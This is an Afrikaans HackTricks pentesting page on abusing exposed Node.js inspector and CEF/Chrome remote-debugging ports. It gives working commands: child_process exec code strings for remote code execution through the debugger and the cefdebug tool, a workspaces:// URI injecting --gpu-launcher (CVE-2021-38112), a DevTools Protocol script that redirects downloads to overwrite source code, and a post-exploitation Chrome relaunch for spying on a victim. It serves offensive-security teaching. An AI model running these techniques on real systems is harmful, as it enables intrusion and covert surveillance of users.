# Node-inspekteerder/CEF-debugmisbruik

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

[Van die dokumente](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wanneer dit begin word met die `--inspect` skakelaar, luister 'n Node.js-proses vir 'n foutopsporingsklient. Standaard sal dit luister by gasheer en poort **`127.0.0.1:9229`**. Elke proses word ook 'n **unieke** **UUID** toegewys.

Inspekteerkliente moet die gasheeradres, poort en UUID ken en spesifiseer om te kan koppel. 'n Volledige URL sal iets lyk soos `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Aangesien die **foutopsporer volle toegang tot die Node.js-uitvoeringsomgewing het**, mag 'n skadelike aktor wat in staat is om met hierdie poort te koppel, arbitrêre kode kan uitvoer namens die Node.js-proses (**potensiële voorreg-escalasie**).
{% endhint %}

Daar is verskeie maniere om 'n inspekteerder te begin:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wanneer jy 'n nagevorsde proses begin sal iets soos hierdie verskyn:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prosesse gebaseer op **CEF** (**Chromium Embedded Framework**) soos benodig om die param: `--remote-debugging-port=9222` te gebruik om die **debugger** oop te maak (die SSRF-beskermings bly baie soortgelyk). Tog, hulle **in plaas daarvan** om 'n **NodeJS** **debug** sessie toe te staan, sal kommunikeer met die blaaier deur die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), dit is 'n koppelvlak om die blaaier te beheer, maar daar is nie 'n direkte RCE nie.

Wanneer jy 'n gedebugde blaaier begin sal iets soos hierdie verskyn:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Webblaaier, WebSockets en selfde-oorsprong beleid <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in 'n webblaaier oopgemaak word, kan WebSocket- en HTTP-versoeke doen onder die blaaier se sekuriteitsmodel. 'n **Aanvanklike HTTP-verbinding** is nodig om 'n **unieke aflyn-ontleder-sessie-id te verkry**. Die **selfde-oorsprong-beleid** **voorkom** dat webwerwe in staat is om **hierdie HTTP-verbinding** te maak. Vir addisionele sekuriteit teen [**DNS-herbindingsaanvalle**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** verifieer Node.js dat die **'Host'-koppe** vir die verbinding óf 'n **IP-adres** óf **`localhost`** óf **`localhost6`** presies spesifiseer.

{% hint style="info" %}
Hierdie **sekuriteitsmaatreëls voorkom die uitbuiting van die inspekteur** om kode uit te voer deur **net 'n HTTP-versoek te stuur** (wat gedoen kon word deur 'n SSRF-vuln uit te buit).
{% endhint %}

### Inspekteur begin in lopende prosesse

Jy kan die **sein SIGUSR1** stuur na 'n lopende nodejs-proses om dit **die inspekteur te begin** op die verstekpoort. Let egter daarop dat jy genoeg voorregte moet hê, sodat dit jou moontlik **bevoorregte toegang tot inligting binne die proses** kan gee, maar nie 'n direkte voorreg-opgradering nie.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Dit is nuttig in houers omdat **die proses afsluit en 'n nuwe een begin** met `--inspect` **nie 'n opsie** is nie omdat die **houer** met die proses **gedood** sal word.
{% endhint %}

### Verbind met inspekteur/debugger

Om met 'n **Chromium-gebaseerde webblaaier** te verbind, kan die `chrome://inspect` of `edge://inspect` URL's vir Chrome of Edge ontsluit word. Deur op die Stel in knoppie te klik, moet verseker word dat die **teiken gasheer en poort** korrek gelys is. Die beeld wys 'n Voorbeeld van 'n Verre Kode-uitvoering (RCE):

![](<../../.gitbook/assets/image (674).png>)

Deur die **opdraglyn** te gebruik, kan jy met 'n debugger/inspekteur verbind met:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Die gereedskap [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), maak dit moontlik om **inspekteurs** wat plaaslik loop te **vind** en **kode in te spuit** daarin.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Let wel dat **NodeJS RCE-uitbuitings** nie sal werk as dit aan 'n webblaaier verbind is via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (jy moet die API nagaan om interessante dinge daarmee te doen).
{% endhint %}

## RCE in NodeJS Debugger/Inspector

{% hint style="info" %}
As jy hier gekom het om uit te vind hoe om **RCE vanaf 'n XSS in Electron te kry, kyk asseblief na hierdie bladsy.**
{% endhint %}

Sommige algemene maniere om **RCE** te verkry wanneer jy kan **verbind** met 'n Node **inspector** is deur iets soos (lyk dit dat dit **nie sal werk in 'n verbinding met die Chrome DevTools-protokol**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protokol Aanvalle

Jy kan die API hier nagaan: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In hierdie afdeling sal ek net interessante dinge lys wat ek vind mense het gebruik om hierdie protokol te misbruik.

### Parameter Injeksie via Diep Skakels

In die [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino Security ontdek dat 'n toepassing gebaseer op CEF 'n aangepaste URI in die stelsel geregistreer het (workspaces://) wat die volledige URI ontvang het en toe die CEF-gebaseerde toepassing **gelaai het met 'n konfigurasie wat gedeeltelik van daardie URI saamgestel was.

Daar is ontdek dat die URI-parameters URL-dekodeer is en gebruik is om die CEF-basis toepassing te begin, wat 'n gebruiker toegelaat het om die vlag **`--gpu-launcher`** in die **opdraglyn** in te spuit en arbitrêre dinge uit te voer.

Dus, 'n aanval soos:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### Oorskryf Lêers

Verander die vouer waar **afgelaaide lêers gestoor gaan word** en laai 'n lêer af om gereeld gebruikte **bronkode** van die program met jou **skadelike kode** te **oorwrite**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE en uitlekking

Volgens hierdie pos: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) is dit moontlik om RCE te verkry en interne bladsye uit te lek vanaf theriver.

### Post-Exploitation

In 'n werklike omgewing en **nadat 'n gebruiker se rekenaar gekompromitteer is** wat 'n Chrome/Chromium-gebaseerde blaaier gebruik, kan jy 'n Chrome-proses begin met die **afdeling geaktiveer en die afdelingspoort deurgegee** sodat jy daartoe toegang kan verkry. Op hierdie manier sal jy in staat wees om **alles wat die slagoffer met Chrome doen te ondersoek en sensitiewe inligting te steel**.

Die sluipende manier is om **elke Chrome-proses te beëindig** en dan iets soos te roep
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Verwysings

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
